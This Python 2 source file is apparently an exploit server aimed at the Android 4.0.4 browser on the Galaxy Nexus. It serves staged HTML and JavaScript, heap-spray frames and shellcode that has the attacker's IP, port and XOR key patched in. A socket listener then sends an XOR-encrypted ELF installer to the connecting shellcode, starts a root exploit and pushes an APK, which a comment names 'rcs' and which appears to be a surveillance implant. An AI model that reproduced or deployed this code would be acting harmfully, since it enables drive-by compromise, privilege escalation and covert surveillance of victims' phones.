#!/usr/bin/python

import re
import os
import sys
import cgi
import math
import time
import zlib
import base64
import string
import random
import struct
import socket
import logging
import httplib
import argparse
import urlparse
import threading
import BaseHTTPServer
from exp_server import *
from os.path import join as pjoin

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)

LOG = dict()

# User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; Galaxy Nexus Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30

class Exploit:

    def __init__(self, ip, port, xor_key, file_size, shellcode, final_executable, root_exploit, apk):
        self.ip = ip

        # port is port for shellcode transfer
        self.port = int(port) + 1
        
        # server_port is http port
        self.server_port = int(port)

        self.file_size =  file_size

        self.xor_key = xor_key
        
        self.shellcodefp = shellcode

        self.final_executable = final_executable
        self.root_exploit = root_exploit
        self.apk = apk

        self.http_server = BaseHTTPServer.HTTPServer( ('', int(self.server_port)),
                                                      ExploitHTTPHandler )
        
        self.report_generated = False
        self.report_lock = threading.Lock()

        ExploitHTTPHandler.main_page            = self.generate_main_page()
        ExploitHTTPHandler.stage2               = self.generate_stage2()
        ExploitHTTPHandler.stage1layout         = self.generate_stage1layout()
        ExploitHTTPHandler.stage2layout         = self.generate_stage2layout()
        ExploitHTTPHandler.shellcode            = self.generate_shellcode()
        ExploitHTTPHandler.frame                = self.generate_frame()
        ExploitHTTPHandler.exploit              = self # Not that nice

        self.bailing = False

    def generate_main_page(self):
        d = os.path.dirname(__file__)
        with open(pjoin(d, "main_page.html")) as fp:
            page = fp.read()

        return page

    def generate_stage2(self):
        d = os.path.dirname(__file__)
        with open(pjoin(d, "stage2.html")) as fp:
            page = fp.read()
        
        return page

    def generate_stage1layout(self):
        d = os.path.dirname(__file__)
        with open(pjoin(d, "stage1layout.js")) as fp:
            page = fp.read()
        
        return page

    def generate_stage2layout(self):
        d = os.path.dirname(__file__)
        with open(pjoin(d, "stage2layout.js")) as fp:
            page = fp.read()
        
        return page

    def generate_shellcode(self):
        shellcode = self.shellcodefp.read()

        ELEM_PER_LINE = 8

        octects = self.ip.split(".")
        encip = ''.join(chr(int(x)) for x in octects)

        encport = struct.pack("!H", self.port)
        enckey = struct.pack("<I", self.xor_key)

        shellcode = rreplace(shellcode, "\x0b\x0b\x0b\x0b", encip, 1)
        shellcode = rreplace(shellcode, "\x0a\x0a", encport[1] + encport[0], 1)
        shellcode = rreplace(shellcode, "\x0c\x0c", encport, 1)
        shellcode = rreplace(shellcode, "\x0d\x0d\x0d\x0d", enckey, 1)

        page = "SHELLCODE = [\n"

        for i in range(0, len(shellcode), ELEM_PER_LINE):
            barr = shellcode[i:i+ELEM_PER_LINE]
            page +="    "

            for b in barr:
                page += "0x{:02x}, ".format(ord(b))

            page +="\n"

        page += "];\n"

        return page

    def generate_frame(self):
        d = os.path.dirname(__file__)
        with open(pjoin(d, "./spray-frame.html")) as fp:
            page = fp.read()

        return page

    def socket_server(self):
        logging.debug("Acquiring socket server lock ...")

        self.socket_server_lock.acquire()

        # handle KeyboardInterrupt 'gracefully' within launch()
        if self.bailing:
            return
        
        logging.info("Starting socket server ...")

        conn = None

        restart = True


        while restart is True:
            try:
                # spawn a socket, wait for shellcode to connect back and send 3rd stage

                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.bind( ('', int(self.server_port) +1) )

                self.socket.listen(0)

                # logging.debug('Listen for 3rd stage {}'.format(time.time()))
                # LOG['shellcode_listen_time'] = time.time()


                # conn, addr = self.socket.accept()
                # logging.debug('Got a 3rd stage connection from {}'.format(addr) )
                # LOG['shellcode_client'] = addr

                # conn.sendall(third_stage)
                # LOG['shellcode_sent_time'] = time.time()
                # logging.debug('3rd stage sent {}'.format(time.time()))

                logging.debug('Listen for shared object')
                conn, addr = self.socket.accept()
                logging.debug('Got a shared object connection from {}'.format( addr ) )
                LOG['shared_object_client'] = addr

                conn.sendall(self.final_executable)
                LOG['shared_object_sent_time'] = time.time()
                logging.debug('Final payload sent')

                conn.close()

                self.socket.settimeout(30)

                logging.info('Post exploitation accept')
                conn2, addr2 = self.socket.accept()
                # print addr3

                if( addr[0] != addr2[0] ):
                    raise Exception('Post exploitation: Ip address Mismatch')

#                self.socket_server_post_exploitation(conn2)
                start_exp_server(conn2, self.root_exploit, self.apk)

            except socket.timeout as e:
                LOG['exploit_fail_reason'] = 'Timeout'
                logging.info('Timeout ')
                self.socket.close()
                logging.info('Socket server closed')


        # except Exception:
        #     logging.info('Bailing socket server')

        self.socket.close()
        logging.info('Socket server closed')

        
        #self.http_server.shutdown()
        #logging.info('HTTP server closed')

        self.report()


    def send_apk(self, conn):
        data = open(self.apk, 'r').read()
        
        conn.sendall(str(len(data)))
        conn.sendall(data)
        
        logging.info('Apk sent')


    def launch(self):
        
        self.socket_server_thread = threading.Thread(target=self.socket_server)
        self.socket_server_lock = threading.Lock()
        logging.info("Attempting to start socket server ...")
        self.socket_server_thread.start()

        try:
            logging.info('Starting HTTP server on port {}'.format(self.server_port))
            self.bailing = False            
            self.http_server.serve_forever()
            
        except KeyboardInterrupt:
            self.bail()

        self.report()


    def bail(self):
        logging.info('Bailing HTTP server')
        self.http_server.shutdown()
        self.bailing = True

        try:
            self.socket_server_lock.release()
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
        except Exception:
            logging.debug('Release socket server lock')
            pass

        logging.info('HTTP server closed')        



    def report(self):

        self.report_lock.acquire()
        
        cleartext = ''

        if not self.report_generated:

            logging.debug('-----> Report <------')

            self.report_generated = True
            
            logging.debug('---------------------')
        
        self.report_lock.release()


class ExploitHTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    firstStageSuccessful = False
    gadgets = {}

    def do_POST(self):
        
        path = urlparse.urlparse(self.path).path

        
    def do_GET(self):

        path = urlparse.urlparse(self.path).path

        # print self.headers, path
        try:
            userAgent =  self.headers['User-agent']
        except KeyError:
            userAgent = 'NA'


        # logging.debug('User Agent {}'.format(userAgent))
        LOG['user_agent'] = userAgent

        if path == "/":   # main page
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.main_page)
            logging.debug('First request: {}'.format(time.time()) )
            LOG['first_request_time'] = time.time()

        elif path == "/stage2.html":   # re-send main page TODO change the pages from stage1 and stage2
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.stage2)
            logging.debug('First request: {}'.format(time.time()) )
            LOG['first_request_time'] = time.time()

        elif path == "/stage1layout.js":
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(self.stage1layout)
            logging.debug('Stage1layout: {}'.format(time.time()) )
            LOG['stage1layout_request_time'] = time.time()

        elif path == "/stage2layout.js":
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(self.stage2layout)
            logging.debug('Stage2layout: {}'.format(time.time()) )
            LOG['stage2layout_request_time'] = time.time()

        elif path == "/shellcode.js":
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(self.shellcode)
            logging.debug('Shellcode: {}'.format(time.time()) )
            LOG['shellcode_request_time'] = time.time()

        elif path == "/spray-frame.html":
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.frame)
            logging.debug('Frame: {}'.format(time.time()) )
            LOG['frame_request_time'] = time.time()

        elif path == "/archer.jpg":
            self.send_response(200)
            self.send_header('Cache-control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            d = os.path.dirname(__file__)
            with open(pjoin(d, "archer.jpg"), "rb") as fp:
                img = fp.read()

            self.wfile.write(img)

        elif path == "/favicon.ico":
            self.send_response(404)
        else:
            self.send_empty_reply()


    def send_empty_reply(self):
        self.send_response(200)
        self.end_headers()
        
        redirect_page = '''

function roll() {
  document.location = "http://lmgtfy.com/?q=fox%20news";
}

'''
        self.wfile.write(redirect_page)
        logging.debug('Empty reply: {}'.format(time.time()) )
        LOG['empty_reply_time'] = time.time()




# utility methods
def xor(payload, key):

    file_size = 0

    out = ''

#    key = int(xor_key, 16)
    key = struct.unpack("<I", struct.pack(">I", key))[0]

    for block in iter(lambda: payload.read(4), ""):

        if len(block) == 4:
            result = struct.unpack('>I', block)[0] ^ key
            out += struct.pack('>I',result)

            file_size += 4

        # last block
        else:
            file_size += len(block)

            key_tuple = struct.unpack("<BBBB", struct.pack('>I', key))

            block_fmt = 'B' * len(block)
            block_tuple = struct.unpack('>' + block_fmt, block)

            i=3
            j=0
            for c in block_tuple:
                out += struct.pack('>B', c ^ key_tuple[j]) 
                i-=1
                j+=1

    return out, file_size


def xor_buffer(payload, xor_key):

    out = []
    key = [int(xor_key[i:i+2],16) for i in range(0, len(xor_key)-1, 2)]
    
    i = 0
    while( i < len(payload) ):

        block = payload[i:i+4]
    
        block[0] ^= key[3]
        block[1] ^= key[2]
        block[2] ^= key[1]
        block[3] ^= key[0]
        
        out[i:i+4] = block

        i+=4
    
    return out

def rreplace(s, old, new, occurrence):
    li = s.rsplit(old, occurrence)
    return new.join(li)

def hex_32bit(s):
    if s.startswith("0x"):
        sval = sval[2:]
    else:
        sval = s

    try:
        value = int(sval, 16)
    except ValueError:
        msg = "{} is not a valid 32-bit hexadecimal value".format(s)
        raise argparse.ArgumentTypeError(msg)

    if value < 0 or value > 0xffffffff:
        msg = "{} is not a valid 32-bit hexadecimal value".format(s)
        raise argparse.ArgumentTypeError(msg)

    return value


def main():
    LOG['command_line'] = ' '.join(sys.argv[:])

    parser = argparse.ArgumentParser(description="Android exploit for Galaxy Nexus @ 4.0.4 server")
    parser.add_argument('ip', help="The server ip address")
    parser.add_argument('port', type=int, help="The server port")
    parser.add_argument('shellcode', type=argparse.FileType("rb"), help="The shellcode to send in raw binary form")
    parser.add_argument('shared_object', type=argparse.FileType("rb"), help="The installer shared object")
    parser.add_argument('root_exploit', type=argparse.FileType("rb"), help="The root exploit to use")
    parser.add_argument('apk', type=argparse.FileType("rb"), help="The apk file to install")
    parser.add_argument("--key", "-k", type=hex_32bit, default=0, help="A 32-bit hex xor key (e.g. 123abcde)")

    args = parser.parse_args()

    # a] parameters validation
    # 1] server ip
    octects = args.ip.split('.')
    if not ( len(octects) == 4 and all(0 <= int(o) < 256 for o in octects)):
        raise Exception('Wrong server ip')

    # 2] server port 
    if( args.port < 0 or args.port > 65535 ):
        raise Exception('Invalid port number')

    # # 3] shared object

    shared_object = args.shared_object

    shared_object.seek(1)
    if shared_object.read(3) != 'ELF':
        raise Exception('File {} is not an ELF binary'.format(sys.argv[3]))

    shared_object.seek(0)

    # xor_key = sys.argv[4]

    # 5] rcs apk
    try:
        open(sys.argv[5], 'r')
    except IOError:
        raise Exception('Apk {} does not exist'.format(sys.argv[4]))

    apk        = sys.argv[5]


    # b] parameters validated, launch exploit

    final_executable, file_size = xor(shared_object, args.key)

    exploit = Exploit( args.ip,
                       args.port,
                       args.key,
                       file_size,
                       args.shellcode,
                       final_executable,
                       args.root_exploit,
                       args.apk)
    
    exploit.launch()



if __name__ == '__main__':

    main()
